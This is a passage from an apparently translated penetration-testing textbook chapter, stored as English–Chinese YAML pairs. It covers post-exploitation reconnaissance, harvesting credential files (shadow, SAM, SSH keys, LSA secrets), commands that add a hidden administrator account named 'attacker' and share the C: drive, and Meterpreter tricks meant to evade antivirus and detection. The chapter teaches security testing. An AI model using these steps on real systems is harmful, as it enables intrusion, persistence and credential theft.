- en: '11'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '11'
- en: Action on the Objective and Lateral Movement
  id: totrans-1
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 目标操作与横向移动
- en: If exploiting a system is the definition of what a penetration test is, it is
    the action on the objective after the exploitation that gives the test its real
    purpose. This step demonstrates the severity of the exploit and the impact that
    it could have on the organization. This chapter will focus on the immediate post-exploit
    activities, as well as the aspect of horizontal privilege escalation—the process
    of using an exploited system as a starting point to jump on to other systems on
    the network.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 如果利用系统是渗透测试的定义，那么在利用之后的操作才赋予测试真正的意义。这一步骤展示了漏洞的严重性及其可能对组织产生的影响。本章将重点讨论立即的后利用活动，以及横向权限提升的方面——即利用被攻破的系统作为起点跳跃到网络上的其他系统。
- en: 'By the end of this chapter, you will have learned about the following topics:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 到本章结束时，你将学到以下内容：
- en: Local privilege escalation
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 本地权限提升
- en: Post-exploitation tools
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 后利用工具
- en: Lateral movement within the target networks
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在目标网络中的横向移动
- en: Compromising domain trusts
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 破坏域信任
- en: Pivoting and port forwarding
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 横向渗透和端口转发
- en: Activities on the compromised local system
  id: totrans-9
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在被攻破的本地系统上的活动
- en: It is usually possible to get guest or user access to a system. Frequently,
    the attacker’s ability to access important information will be limited by reduced
    privilege levels. Therefore, a common post-exploitation activity is to escalate
    access privileges from guest to user to administrator and, finally, to SYSTEM.
    This upward progression of gaining access privileges is usually referred to as
    **vertical privilege escalation**.
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 通常可以获得系统的访客或用户访问权限。攻击者访问重要信息的能力通常会受到较低权限级别的限制。因此，常见的后利用活动是将访问权限从访客提升到用户，再到管理员，最后提升为SYSTEM。这个逐步提升访问权限的过程通常被称为**垂直权限提升**。
- en: 'The user can implement several methods to gain advanced access credentials,
    including the following:'
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 用户可以通过几种方法获得高级访问凭证，包括以下几种：
- en: Employ a network sniffer and/or keylogger to capture transmitted user credentials
    (`bettercap`, `responder`, or `dsniff` are designed designed to extract passwords
    from live transmissions or a PCAP file that has been saved from a Wireshark or
    `tshark` session).
  id: totrans-12
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用网络嗅探器和/或键盘记录器捕获传输中的用户凭证（`bettercap`、`responder` 或 `dsniff` 设计用于从实时传输或保存的Wireshark或`tshark`会话的PCAP文件中提取密码）。
- en: Perform a search for locally stored passwords. Some users collect passwords
    in an email folder (frequently called `passwords`). Since password reuse and simple
    password construction systems are common, the passwords that are found can be
    employed during the escalation process.
  id: totrans-13
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 搜索本地存储的密码。一些用户将密码保存在邮件文件夹中（通常称为`passwords`）。由于密码重用和简单密码构造系统很常见，找到的密码可以在权限提升过程中使用。
- en: NirSoft ([www.nirsoft.net](http://www.nirsoft.net)) produces several free tools
    that can be uploaded to the compromised system by using Meterpreter to extract
    passwords from the operating system and applications that cache passwords (mail,
    remote access software, FTP, and web browsers).
  id: totrans-14
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: NirSoft（[www.nirsoft.net](http://www.nirsoft.net)）提供了几款免费的工具，可以通过使用Meterpreter上传到被攻破的系统，提取操作系统和缓存密码的应用程序中的密码（如邮件、远程访问软件、FTP和网页浏览器）。
- en: Dump the `SAM` and `SYSKEY` files using Meterpreter.
  id: totrans-15
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用Meterpreter转储`SAM`和`SYSKEY`文件。
- en: When some applications load, they read **dynamic link library** (**DLL**) files
    in a particular order. It is possible to create a fake DLL with the same name
    as a legitimate DLL, place it in a specific directory location, and have the application
    load and execute it, resulting in elevated privileges for the attacker.
  id: totrans-16
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 当某些应用程序加载时，它们会按照特定的顺序读取**动态链接库**（**DLL**）文件。攻击者可以创建一个与合法DLL同名的伪造DLL，将其放置在特定目录中，使应用程序加载并执行，从而为攻击者提供提升的权限。
- en: Apply an exploit that uses a buffer overflow or other means to escalate privileges.
  id: totrans-17
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用缓冲区溢出或其他手段来提升权限的漏洞利用。
- en: Execute the `getsystem` script, which will automatically escalate administrator
    privileges to the SYSTEM level, from the Meterpreter prompt.
  id: totrans-18
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 执行`getsystem`脚本，该脚本将自动将管理员权限提升至SYSTEM级别，命令在Meterpreter提示符下执行。
- en: Conducting rapid reconnaissance of a compromised system
  id: totrans-19
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 对被攻破系统进行快速侦察
- en: Once a system has been compromised, the attacker needs to gain critical information
    about that system, its network environment, users, and user accounts. Usually,
    they will enter a series of commands or a script that invokes these commands from
    the shell prompt.
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦系统被入侵，攻击者需要获取关于该系统、其网络环境、用户和用户账户的关键信息。通常，他们会在 shell 提示符下输入一系列命令或脚本来调用这些命令。
- en: 'If the compromised system is based on the Unix platform, typical local reconnaissance
    commands will include the following:'
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 如果被攻击的系统基于 Unix 平台，则典型的本地侦察命令包括以下内容：
- en: '| **Command** | **Description** |'
  id: totrans-22
  prefs: []
  type: TYPE_TB
  zh: '| **命令** | **描述** |'
- en: '| `/etc/resolv.conf` | Uses the `copy` command to access and review the system’s
    current DNS settings. Because it is a global file with read privileges, it will
    not trigger alarms when accessed. |'
  id: totrans-23
  prefs: []
  type: TYPE_TB
  zh: '| `/etc/resolv.conf` | 使用 `copy` 命令来访问和查看系统当前的 DNS 设置。由于它是一个具有读取权限的全局文件，访问时不会触发警报。
    |'
- en: '| `/etc/passwd` and `/etc/shadow` | These are system files that contain username
    and password hashes. It can be copied by a person with root-level access, and
    the passwords can be broken using a tool such as John the Ripper. |'
  id: totrans-24
  prefs: []
  type: TYPE_TB
  zh: '| `/etc/passwd` 和 `/etc/shadow` | 这些是包含用户名和密码哈希的系统文件。具有 root 级访问权限的人可以复制它，并可以使用诸如
    John the Ripper 的工具破解密码。 |'
- en: '| `whoami` and `who -a` | Identifies the users on a local system. |'
  id: totrans-25
  prefs: []
  type: TYPE_TB
  zh: '| `whoami` 和 `who -a` | 识别本地系统上的用户。 |'
- en: '| `ifconfig -a`, `iptables -L -n`, and `netstat -r` | Provides networking information.
    `ifconfig -a` provides IP addressing details, `iptables -L -n` lists all of the
    rules held in the local firewall (if present), and `netstat -r` displays the routing
    information maintained by the kernel. |'
  id: totrans-26
  prefs: []
  type: TYPE_TB
  zh: '| `ifconfig -a`, `iptables -L -n`, 和 `netstat -r` | 提供网络信息。 `ifconfig -a` 提供
    IP 地址详细信息，`iptables -L -n` 列出本地防火墙中的所有规则（如果有），`netstat -r` 显示内核维护的路由信息。 |'
- en: '| `uname -a` | Prints the kernel version. |'
  id: totrans-27
  prefs: []
  type: TYPE_TB
  zh: '| `uname -a` | 打印内核版本。 |'
- en: '| `ps aux` | Prints the currently running services, the process ID, and additional
    information. |'
  id: totrans-28
  prefs: []
  type: TYPE_TB
  zh: '| `ps aux` | 显示当前运行的服务、进程 ID 和附加信息。 |'
- en: '| `dpkg -l yum list &#124; grep installed` and `dpkg -l rpm -qa --last &#124;
    head` | Identifies the installed software packages. |'
  id: totrans-29
  prefs: []
  type: TYPE_TB
  zh: '| `dpkg -l yum list &#124; grep installed` 和 `dpkg -l rpm -qa --last &#124;
    head` | 识别已安装的软件包。 |'
- en: 'Table 11.1: Linux commands for reconnaissance that can be utilized by the pentesters'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 表 11.1：可以由渗透测试人员使用的用于侦察的 Linux 命令
- en: These commands contain a brief synopsis of the options that are available. Refer
    to the appropriate command’s help file for complete information on how it can
    be used.
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 这些命令包含了可用选项的简要概述。请参考相应命令的帮助文件，了解如何完整使用它们。
- en: 'For a Windows system, the following commands will be entered:'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 对于 Windows 系统，将输入以下命令：
- en: '| **Command** | **Description** |'
  id: totrans-33
  prefs: []
  type: TYPE_TB
  zh: '| **命令** | **描述** |'
- en: '| --- | --- |'
  id: totrans-34
  prefs: []
  type: TYPE_TB
  zh: '| --- | --- |'
- en: '| `whoami /all` | Lists the current user, SID, user privileges, and groups.
    |'
  id: totrans-35
  prefs: []
  type: TYPE_TB
  zh: '| `whoami /all` | 列出当前用户、SID、用户权限和组。 |'
- en: '| `ipconfig /all` and `ipconfig /displaydns` | Displays information regarding
    the network interface, connectivity protocols, and local DNS cache. |'
  id: totrans-36
  prefs: []
  type: TYPE_TB
  zh: '| `ipconfig /all` 和 `ipconfig /displaydns` | 显示有关网络接口、连接协议和本地 DNS 缓存的信息。 |'
- en: '| `netstat -bnao` and `netstat -r` | Lists the ports and connections with the
    corresponding processes (`-b`) to no lookups (`-n`), all connections (`-a`), and
    parent process IDs (`-o`). The `-r` option displays the routing table. They require
    administrator rights to run. |'
  id: totrans-37
  prefs: []
  type: TYPE_TB
  zh: '| `netstat -bnao` 和 `netstat -r` | 列出端口和相应进程 (`-b`)，不进行名称查找 (`-n`)，所有连接 (`-a`)
    和父进程 ID (`-o`)。 `-r` 选项显示路由表。需要管理员权限运行。 |'
- en: '| `net view` and `net view /domain` | Queries NBNS/SMB to locate all of the
    hosts in the current workgroup or domain. All of the domains that are available
    to the host are given by `/domain`. |'
  id: totrans-38
  prefs: []
  type: TYPE_TB
  zh: '| `net view` 和 `net view /domain` | 查询 NBNS/SMB 来定位当前工作组或域中所有主机。`/domain` 参数给出主机可用的所有域。
    |'
- en: '| `net user /domain` | Lists all of the users in the defined domain. |'
  id: totrans-39
  prefs: []
  type: TYPE_TB
  zh: '| `net user /domain` | 列出定义域中的所有用户。 |'
- en: '| `net user %username% /domain` | Obtains information on the current user if
    they are part of the queried domain (if you are a local user, then `/domain` is
    not required). It includes the login times, the last time that the password was
    changed, the logon scripts, and the group memberships. |'
  id: totrans-40
  prefs: []
  type: TYPE_TB
  zh: '| `net user %username% /domain` | 获取当前用户的信息（如果他们是查询域的一部分，则不需要 `/domain`）。包括登录时间、上次更改密码时间、登录脚本和组成员资格。
    |'
- en: '| `net accounts` | Prints the password policy for the local system. To print
    the password policy for the domain, use `net accounts /domain`. |'
  id: totrans-41
  prefs: []
  type: TYPE_TB
  zh: '| `net accounts` | 打印本地系统的密码策略。要打印域的密码策略，使用 `net accounts /domain`。 |'
- en: '| `net localgroup administrators` | Prints the members of the administrator’s
    local group. Use the `/domain` switch to obtain the administrators for the current
    domain. |'
  id: totrans-42
  prefs: []
  type: TYPE_TB
  zh: '| `net localgroup administrators` | 打印管理员本地组的成员。使用 `/domain` 开关可以获取当前域的管理员。
    |'
- en: '| `net group "Domain Controllers" /domain` | Prints out a list of domain controllers
    for the current domain. |'
  id: totrans-43
  prefs: []
  type: TYPE_TB
  zh: '| `net group "Domain Controllers" /domain` | 打印当前域的域控制器列表。 |'
- en: '| `net share` | Displays the currently shared folders, which may not provide
    sufficient access controls for the data shared within the folders, and the paths
    that they point to. |'
  id: totrans-44
  prefs: []
  type: TYPE_TB
  zh: '| `net share` | 显示当前共享的文件夹，这些文件夹可能没有为共享其中的数据提供足够的访问控制，以及它们指向的路径。 |'
- en: 'Table 11.2: Windows commands for reconnaissance that can be utilized by the
    pentesters'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 表 11.2：渗透测试人员可以利用的 Windows 侦察命令
- en: Finding and taking sensitive data – pillaging the target
  id: totrans-46
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 查找并获取敏感数据——掠夺目标
- en: The term **pillaging** (sometimes known as **pilfering**) is a holdover from
    the days when hackers who had successfully compromised a system saw themselves
    as pirates, racing to their target to steal or damage as much data as possible.
    These terms have survived as a reference to the much more careful practice of
    stealing or modifying proprietary or financial data when the objective of the
    exploit has been achieved.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: '**掠夺**（有时称为 **窃取**）一词源自黑客成功攻破系统后，将自己视为海盗，争分夺秒地窃取或损坏尽可能多的数据。这些术语已成为对更加谨慎的行为的参考，即在完成攻击目标后窃取或修改专有数据或财务数据的行为。'
- en: 'The attacker can then focus on the secondary target—system files that will
    provide information to support additional attacks. The choice of the secondary
    files will depend on the operating system of the target. For example, if the compromised
    system is Unix, then the attacker will also target the following:'
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者接下来可以集中精力攻击次要目标——系统文件，这些文件将提供支持进一步攻击的信息。次要文件的选择将取决于目标的操作系统。例如，如果被攻破的系统是 Unix，则攻击者还将针对以下目标：
- en: The system and configuration files (usually in the `/etc` directory, but depending
    on the implementation, they may be in `/usr/local/etc` or other locations)
  id: totrans-49
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 系统和配置文件（通常位于 `/etc` 目录中，但根据实现情况，可能位于 `/usr/local/etc` 或其他位置）
- en: The password files (`/etc/password` and `/etc/shadow`)
  id: totrans-50
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 密码文件（`/etc/password` 和 `/etc/shadow`）
- en: The configuration files and public/private keys in the `.ssh` directory
  id: totrans-51
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`.ssh` 目录中的配置文件和公私密钥'
- en: The public and private key rings that may be contained in the `.gnupg` directory
  id: totrans-52
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`.gnupg` 目录中可能包含的公私密钥环'
- en: The email and data files
  id: totrans-53
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 邮件和数据文件
- en: 'In a Windows system, the attacker will target the following:'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Windows 系统中，攻击者将针对以下目标：
- en: The system memory, which can be used to extract passwords, encryption keys,
    and so on
  id: totrans-55
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 系统内存，可以用来提取密码、加密密钥等信息
- en: The system registry files
  id: totrans-56
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 系统注册表文件
- en: The **Security Accounts Manager** (**SAM**) database, which contains hashed
    versions of the password, or alternative versions of the SAM database, which may
    be found in `%SYSTEMROOT%\repair\SAM` and `c:\Windows\System32\config\`
  id: totrans-57
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**安全账户管理器**（**SAM**）数据库，其中包含密码的哈希版本，或者可能在 `%SYSTEMROOT%\repair\SAM` 和 `c:\Windows\System32\config\`
    中找到的 SAM 数据库的其他版本'
- en: Any other password or seed files that are used for encryption
  id: totrans-58
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 任何其他用于加密的密码或种子文件
- en: The email and data files
  id: totrans-59
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 邮件和数据文件
- en: Don’t forget to review any folders that contain temporary items, such as attachments.
    For example, `UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\`
    may contain files, images, and cookies that may be of interest.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 不要忘记检查任何包含临时项目的文件夹，如附件。例如，`UserProfile\AppData\Local\Microsoft\Windows\Temporary
    Internet Files\` 可能包含可能感兴趣的文件、图片和 cookies。
- en: 'As stated previously, the system memory contains a significant amount of information
    for any attacker. Therefore, it is usually a priority file that you need to obtain.
    The system memory can be downloaded as a single image file from several sources,
    as follows:'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所述，系统内存包含了大量信息，对于任何攻击者来说，这些信息都是重要的。因此，它通常是需要获取的优先文件。系统内存可以从多个来源以单个镜像文件下载，如下所示：
- en: By uploading a tool to the compromised system and then directly copying the
    memory (these tools include **Belkasoft RAM capturer**, **Mandiant Memoryze**,
    and **MoonSols Dumpit**)
  id: totrans-62
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过向被攻陷的系统上传工具，并直接复制内存（这些工具包括**Belkasoft RAM Capturer**、**Mandiant Memoryze**和**MoonSols
    Dumpit**）
- en: By copying the Windows hibernation file, `hiberfil.sys`, and then mounting it
    using forensic tools to decrypt and analyze the file offline
  id: totrans-63
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过复制 Windows 的休眠文件 `hiberfil.sys`，然后使用取证工具挂载它以离线解密和分析该文件
- en: By copying a virtual machine and converting the VMEM (virtual machine’s paging
    file) file to a memory file
  id: totrans-64
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过复制虚拟机并将 VMEM（虚拟机的分页文件）文件转换为内存文件
- en: If you upload a program that’s designed to capture memory onto a compromised
    system, it is possible that this particular application will be identified as
    malicious software by antivirus software. Most antivirus/EDR software applications
    recognize the hash signature and behavior of memory acquisition software, and
    act to protect the sensitive contents of the physical memory by raising an alarm
    if it is at risk of disclosure. The acquisition software will be quarantined,
    and the target will receive a warning, alerting them of the attack.
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你向被攻陷的系统上传了一个设计用来捕获内存的程序，这个程序有可能会被杀毒软件识别为恶意软件。大多数杀毒/EDR 软件可以识别内存采集软件的哈希签名和行为，并在其可能泄露敏感内容时发出警报保护物理内存。采集软件会被隔离，目标会收到警告，提示他们遭遇了攻击。
- en: 'To avoid this, use the Metasploit Framework to run the executable completely
    in the target’s memory using the following command:'
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 为了避免这种情况，使用 Metasploit Framework 完全在目标的内存中运行可执行文件，使用以下命令：
- en: '[PRE0]'
  id: totrans-67
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: The previous command executes `calc.exe` as a dummy executable, but uploads
    the memory acquisition executable to run in its process space instead.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 上述命令执行 `calc.exe` 作为一个虚拟可执行文件，但实际上将内存采集可执行文件上传，并在其进程空间中运行。
- en: The executable doesn’t show up in process lists, such as Task Manager, and detection
    using data forensic techniques is much harder because it’s not written to disk.
    Furthermore, it will avoid the system’s antivirus software, which generally does
    not scan the memory space in search of malware.
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 该可执行文件不会出现在进程列表中，例如任务管理器中，且通过数据取证技术进行检测会更困难，因为它不会写入磁盘。此外，它将避免系统的杀毒软件，因为一般杀毒软件不会扫描内存空间以寻找恶意软件。
- en: 'Once the physical memory has been downloaded, it can be analyzed using the
    Volatility framework, which is a collection of Python scripts that are designed
    to forensically analyze memory. If the operating system is supported, Volatility
    will scan the memory file and extract the following:'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦物理内存被下载，可以使用 Volatility 框架进行分析。Volatility 是一组 Python 脚本，旨在对内存进行取证分析。如果操作系统受支持，Volatility
    会扫描内存文件并提取以下内容：
- en: The image information and system data that is sufficient for *tying* the image
    to its source system.
  id: totrans-71
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 足以*关联*镜像与其源系统的镜像信息和系统数据。
- en: The running processes, loaded DLLs, threads, sockets, connections, and modules.
  id: totrans-72
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 正在运行的进程、加载的 DLL、线程、套接字、连接和模块。
- en: The open network sockets and connections, and recently opened network connections.
  id: totrans-73
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 打开的网络套接字和连接，以及最近打开的网络连接。
- en: The memory address, including physical and virtual memory mapping.
  id: totrans-74
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 内存地址，包括物理和虚拟内存映射。
- en: 'The LM/NTLM hashes and LSA secrets. **LanMan** (**LM**) password hashes are
    Microsoft’s original attempt at protecting passwords. Over the years, it has become
    simple to break them and convert the hashes back into an actual password. **NT
    LanMan** (**NTLM**) hashes are more recent and resilient to attack. However, they
    are usually stored with the NTLM versions for backward compatibility. A **Local
    Security Authority** (**LSA**) stores secrets that are local passwords: remote
    access (wired or wireless), VPN, autologon passwords, and so on. Any passwords
    that are stored on the system are vulnerable, especially if the user reuses passwords.'
  id: totrans-75
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: LM/NTLM 哈希和 LSA 密钥。**LanMan**（**LM**）密码哈希是微软最初为保护密码而设计的方案。多年来，破解它们变得非常简单，可以将哈希值转换回实际密码。**NT
    LanMan**（**NTLM**）哈希是更新的版本，更能抵抗攻击。然而，它们通常与 NTLM 版本一起存储，以保证向后兼容性。**本地安全机构**（**LSA**）存储着本地密码的秘密：远程访问（有线或无线）、VPN、自动登录密码等。系统中存储的任何密码都是脆弱的，尤其是当用户重复使用密码时。
- en: Specific regular expressions or strings stored in memory.
  id: totrans-76
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 存储在内存中的特定正则表达式或字符串。
- en: Creating additional accounts
  id: totrans-77
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 创建额外的账户
- en: 'The following commands are highly invasive and are usually detected by the
    system owner during the incident response process. However, they are frequently
    planted by an attacker to draw attention away from more persistent access mechanisms:'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 以下命令具有高度侵入性，通常在事件响应过程中会被系统所有者检测到。然而，攻击者经常会植入这些命令，以便将注意力转移到更持久的访问机制上：
- en: '| **Command** | **Description** |'
  id: totrans-79
  prefs: []
  type: TYPE_TB
  zh: '| **命令** | **描述** |'
- en: '| `net user attacker password /add``net user testuser testpassword /ADD /DOMAIN`
    | Creates a new local account with a user called `attacker` and a password set
    to `password`.It also adds the same user to the domain if you are running the
    command on a domain controller. |'
  id: totrans-80
  prefs: []
  type: TYPE_TB
  zh: '| `net user attacker password /add``net user testuser testpassword /ADD /DOMAIN`
    | 创建一个名为`attacker`的新本地帐户，并将密码设置为`password`。如果你在域控制器上运行该命令，它还将相同的用户添加到域中。 |'
- en: '| `net localgroup administrators attacker /add` | Adds a new user called `attacker`
    to the local administrators group. In some cases, the command will be `net localgroup
    administrators /add attacker`. |'
  id: totrans-81
  prefs: []
  type: TYPE_TB
  zh: '| `net localgroup administrators attacker /add` | 将名为`attacker`的新用户添加到本地管理员组。在某些情况下，命令将是`net
    localgroup administrators /add attacker`。 |'
- en: '| `net user username /active:yes /domain` | Changes an inactive or disabled
    account to active. In a small organization, this will attract attention. Large
    enterprises with poor password management can have 30% of their passwords flagged
    as inactive, so it may be an effective way to gain an account. |'
  id: totrans-82
  prefs: []
  type: TYPE_TB
  zh: '| `net user username /active:yes /domain` | 将一个非活动或禁用的帐户更改为活动帐户。在小型组织中，这会引起注意。密码管理不善的大型企业可能有30%的密码被标记为非活动，因此这可能是获取帐户的一种有效方式。
    |'
- en: '| `net share name$=C:\ /grant:attacker,FULL /unlimited` | Shares `C:` (or another
    specified drive) as a Windows share, and grants the user (attacker) full rights
    to access or modify all of the content on that drive. |'
  id: totrans-83
  prefs: []
  type: TYPE_TB
  zh: '| `net share name$=C:\ /grant:attacker,FULL /unlimited` | 将`C:`（或指定的其他驱动器）作为Windows共享，并授予用户（攻击者）完全访问或修改该驱动器上所有内容的权限。
    |'
- en: 'Table 11.3: Windows commands that can be utilized to create users on local
    and domain servers'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 表 11.3：可用于在本地和域服务器上创建用户的Windows命令
- en: 'If you create a new user account, it will be noticed when anyone logs on to
    the welcome screen of the compromised system. To make the account invisible, you
    need to modify the registry from the command line using the following `REG` command:'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你创建一个新的用户帐户，当有人登录到受损系统的欢迎屏幕时，会注意到这一点。为了使该帐户不可见，你需要通过命令行修改注册表，使用以下`REG`命令：
- en: '[PRE1]'
  id: totrans-86
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: This will modify the designated registry key to hide the account of the user
    (`/V`). Again, there may be special syntax requirements based on the specific
    version of the target’s operating system, so determine the Windows version first
    and then validate it in a controlled test environment before implementing it against
    the target.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 这将修改指定的注册表键，以隐藏用户（`/V`）的帐户。再次强调，具体操作可能会受到目标操作系统版本的特殊语法要求影响，因此首先确定Windows版本，然后在受控测试环境中验证，再对目标实施。
- en: Post-exploitation tools
  id: totrans-88
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 后期利用工具
- en: 'Post-exploitation is the art of using the existing level of access to escalate,
    exploit, and exfiltrate. In the following sections, we will explore three different
    post-exploitation tools: Metasploit’s Meterpreter, PowerShell Empire, and CrackMapExec.'
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 后期利用是指利用现有的访问权限进行权限提升、利用和数据外流的技巧。在接下来的章节中，我们将探索三种不同的后期利用工具：Metasploit的Meterpreter、PowerShell
    Empire和CrackMapExec。
- en: The Metasploit Framework – Meterpreter
  id: totrans-90
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: Metasploit框架 - Meterpreter
- en: Metasploit was developed to support both exploit and post-exploit activities.
    The present version contains approximately 2,180 exploits, 1,155 auxiliary, and
    399 post-exploitation modules. There are around 229 Windows modules that simplify
    post-exploit activities. We will review some of the most important modules here.
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit是为了支持利用和后期利用活动而开发的。当前版本包含大约2,180个漏洞利用、1,155个辅助模块和399个后期利用模块。大约有229个Windows模块简化了后期利用活动。我们将在这里回顾一些最重要的模块。
- en: In the following examples, we have successfully exploited a vulnerable Microsoft
    exchange server running on Windows 2016 (a classic attack that is frequently used
    to validate more complex aspects of Meterpreter). The initial step is to conduct
    an immediate reconnaissance of the network and the compromised system.
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 在以下示例中，我们成功地利用了运行在Windows 2016上的一个易受攻击的Microsoft Exchange服务器（这是一种经典攻击，经常用于验证Meterpreter的更复杂方面）。初始步骤是对网络和受损系统进行即时侦察。
- en: 'The initial Meterpreter shell is fragile and vulnerable to failure over an
    extended period of time. Therefore, once a system has been exploited, we need
    to migrate the shell and bind it with a more stable process. This also makes detecting
    the exploit more difficult. At the Meterpreter prompt, enter `ps` to obtain a
    list of running processes, as shown in *Figure 11.1*:'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 初始的Meterpreter shell是脆弱的，随着时间推移容易失败。因此，一旦系统被攻击，我们需要迁移shell并将其绑定到一个更稳定的进程上。这也使得检测漏洞变得更加困难。在Meterpreter提示符下，输入`ps`以获取正在运行的进程列表，如*图11.1*所示：
- en: '![](../Images/B17765_11_01.png)'
  id: totrans-94
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_01.png)'
- en: 'Figure 11.1: Using Meterpreter to list all the running processes'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 图11.1：使用Meterpreter列出所有正在运行的进程
- en: 'The `ps` command also returns the full path name for each process. This was
    omitted from *Figure 11.1*. The `ps` list identifies that `c:\windows\explorer.exe`
    is running. In this particular case, it is identified with the process ID of `1868`,
    as shown in *Figure 11.2*. As this is a generally stable application, we will
    migrate the shell to that process:'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: '`ps`命令还会返回每个进程的完整路径名。这一点在*图11.1*中被省略了。`ps`列表标识出`c:\windows\explorer.exe`正在运行。在这个特定案例中，它被标识为进程ID为`1868`，如*图11.2*所示。由于这是一个相对稳定的应用程序，我们将把shell迁移到这个进程上：'
- en: '![](../Images/B17765_11_02.png)'
  id: totrans-97
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_02.png)'
- en: 'Figure 11.2: Migrating to a different privileged process'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 图11.2：迁移到不同的特权进程
- en: 'One of the first parameters to identify is: are we on a virtual machine? With
    the Meterpreter session open between the compromised system and the attacker,
    the `run post exploit module checkvm` command is issued, as shown in *Figure 11.3*.
    The returned data indicates that `This is a VirtualBox Virtual Machine`:'
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 要确定的第一个参数是：我们是否处于虚拟机中？在被攻击的系统和攻击者之间打开Meterpreter会话后，执行`run post exploit module
    checkvm`命令，如*图11.3*所示。返回的数据表明`这是一个VirtualBox虚拟机`：
- en: '![](../Images/B17765_11_03.png)'
  id: totrans-100
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_11_03.png)'
- en: 'Figure 11.3: Using the post-exploit module to gather information about the
    virtual machine'
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 图11.3：使用后期利用模块收集虚拟机信息
- en: 'Some of the most important post-exploitation modules that are available through
    Meterpreter are described in *Table 11.4*:'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 一些最重要的后期利用模块可以通过Meterpreter获得，这些模块在*表11.4*中进行了描述：
- en: '| **Command** | **Description** |'
  id: totrans-103
  prefs: []
  type: TYPE_TB
  zh: '| **命令** | **描述** |'
